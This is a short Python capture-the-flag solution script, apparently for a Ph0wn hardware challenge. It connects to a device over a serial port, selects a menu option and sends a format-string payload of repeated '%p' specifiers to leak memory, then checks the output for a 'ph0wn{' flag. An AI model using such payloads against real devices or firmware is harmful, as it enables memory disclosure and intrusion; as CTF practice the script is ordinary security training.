# Azox is on fire :)
import serial
import time
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style

s = serial.Serial("/dev/ttyUSB0",baudrate=115200, timeout=0.2)


s.write(b"\n")
print(s.read_until(b"Select an option:"))
s.write(b"1")
time.sleep(1)
print(s.read_until(b":"))
sent = b'A '+ b'%p '*8 +b'#'
s.write(sent)
print(f'{Fore.GREEN}{sent}{Style.RESET_ALL}')
time.sleep(1)
received = s.read_all()
if b'ph0wn{' in received:
    print(f"{Fore.GREEN}Looks like we got the flag!{Style.RESET_ALL}")
else:
    print(f"{Fore.RED}Ouch, we didnt get the flag :({Style.RESET_ALL}")
print(received)
